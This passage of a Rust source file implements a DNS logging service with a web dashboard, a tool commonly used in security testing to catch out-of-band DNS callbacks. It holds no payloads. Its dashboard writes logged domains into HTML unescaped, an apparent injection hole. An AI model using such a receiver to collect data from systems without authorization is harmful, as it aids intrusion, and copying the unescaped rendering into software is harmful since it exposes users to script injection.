                    html += '<td>' + recordTypeBadge(log.record_type) + '</td>';
                    html += '<td class="log-domain">' + log.domain + '</td>';
                    html += '<td class="log-ip">' + log.client_ip + '</td>';
                    html += '<td class="log-time">' + relativeTime(log.timestamp) + '<span class="log-time-abs">' + log.timestamp + '</span></td>';
                    html += '</tr>';
                }});
                html += '</tbody></table>';
            }} else {{
                html += '<div style="padding:20px;text-align:center;color:var(--text-muted);font-size:13px;">等待 DNS 查询...</div>';
            }}
            html += '</div>';
        }});
        if (data.length === 0) {{
            html = '<div class="empty-state"><div class="empty-icon">&#x1F4ED;</div><div class="empty-text">暂无子域名</div><div class="empty-hint">请先创建子域名，然后等待 DNS 查询</div></div>';
        }}
        document.getElementById('logsContainer').innerHTML = html;
        document.getElementById('logCount').textContent = totalLogs;
    }} catch (err) {{
        setConnectionStatus(false);
        console.error('fetchLogs error:', err);
    }}
}}

// ---- Create subdomain ----
async function createSubdomain() {{
    try {{
        const res = await fetch('/api/newsub?token=' + TOKEN, {{ method: 'POST' }});
        const data = await res.json();
        if (res.ok) {{
            showToast('创建成功: ' + data.new_sub, 'success');
            fetchSubdomains();
            fetchLogs();
        }} else {{
            showToast(data.error || '创建子域名失败', 'error');
        }}
    }} catch (err) {{
        showToast('网络错误', 'error');
        console.error('createSubdomain error:', err);
    }}
}}

// ---- Clear logs ----
async function clearLogs() {{
    if (!confirm('确定要清空所有 DNS 日志吗？')) return;
    try {{
        const res = await fetch('/api/clear?token=' + TOKEN, {{ method: 'POST' }});
        const data = await res.json();
        if (res.ok) {{
            showToast('已清空 ' + data.cleared + ' 条日志', 'success');
            knownLogIds.clear();
            fetchLogs();
        }} else {{
            showToast(data.error || '清空日志失败', 'error');
        }}
    }} catch (err) {{
        showToast('网络错误', 'error');
    }}
}}

// ---- Connection status ----
function setConnectionStatus(ok) {{
    connectionOk = ok;
    const dot = document.getElementById('statusDot');
    const text = document.getElementById('statusText');
    if (ok) {{
        dot.className = 'status-dot';
        text.textContent = '已连接';
    }} else {{
        dot.className = 'status-dot disconnected';
        text.textContent = '连接断开';
    }}
}}

// ---- Init ----
fetchSubdomains();
fetchLogs();
setInterval(() => {{
    fetchLogs();
    fetchSubdomains();
}}, 5000);
</script>
</body>
</html>"##, token = token);

    HttpResponse::Ok().content_type("text/html; charset=utf-8").body(html)
}

// ---- Main ----

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let manager = SqliteConnectionManager::file("dnslog.db");
    let pool = Pool::new(manager).expect("Failed to create DB pool");

    {
        let conn = pool.get().expect("Failed to get DB connection");
        conn.execute_batch(
            r#"
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                token TEXT NOT NULL UNIQUE,
                access_ip TEXT
            );
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY,
                user_token TEXT NOT NULL,
                subdomain TEXT NOT NULL,
                UNIQUE(user_token, subdomain)
            );
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY,
                registered_subdomain TEXT NOT NULL,
                requested_domain TEXT NOT NULL,
                client_ip TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                record_type TEXT DEFAULT 'A'
            );
            CREATE INDEX IF NOT EXISTS "registered_subdomain" ON "logs" ("registered_subdomain");
            CREATE INDEX IF NOT EXISTS "timestamp" ON "logs" ("timestamp");
            PRAGMA journal_mode = WAL;
            "#
        )
        .expect("Failed to create tables");

        // Migrate: add record_type column if missing
        let has_column: bool = conn
            .query_row(
                "SELECT COUNT(*) FROM pragma_table_info('logs') WHERE name='record_type'",
                [],
                |row| row.get::<_, i64>(0),
            )
            .map(|c| c > 0)
            .unwrap_or(false);
        if !has_column {
            let _ = conn.execute("ALTER TABLE logs ADD COLUMN record_type TEXT DEFAULT 'A'", []);
        }
    }

    let dns_port = env::var("DNS_PORT").unwrap_or_else(|_| "53".to_string());
    let web_port = env::var("WEB_PORT").unwrap_or_else(|_| "8888".to_string());

    let pool_for_dns = pool.clone();
    let dns_bind = format!("0.0.0.0:{}", dns_port);
    let dns_server = tokio::spawn(async move {
        let socket = UdpSocket::bind(&dns_bind)
            .await
            .expect("绑定 DNS 端口失败");
        let mut server = ServerFuture::new(MyDnsHandler { pool: pool_for_dns });
        server.register_socket(socket);
        server.block_until_done().await.expect("DNS server error");
    });

    let pool_for_web = pool.clone();
    let web_server = HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(pool_for_web.clone()))
            .route("/", web::get().to(dashboard))
            .route("/api/subdomains", web::get().to(subdomains_api))
            .route("/api/newsub", web::post().to(newsub_api))
            .route("/api/logs", web::get().to(get_logs_json))
            .route("/api/clear", web::post().to(clear_logs_api))
            .route("/api/callback/{subdomain}", web::get().to(callback_api))
    })
    .bind(format!("0.0.0.0:{}", web_port))?
    .run();

    println!("DNS 服务器监听: 0.0.0.0:{}", dns_port);
    println!("Web 服务器监听: 0.0.0.0:{}", web_port);
    println!("域名后缀: {}", domain_suffix());

    tokio::select! {
        _ = tokio::signal::ctrl_c() => {
            println!("收到 Ctrl+C 信号，正在优雅退出...");
        },
        res = web_server => {
            res?;
        }
    }

    dns_server.abort();
    Ok(())
}
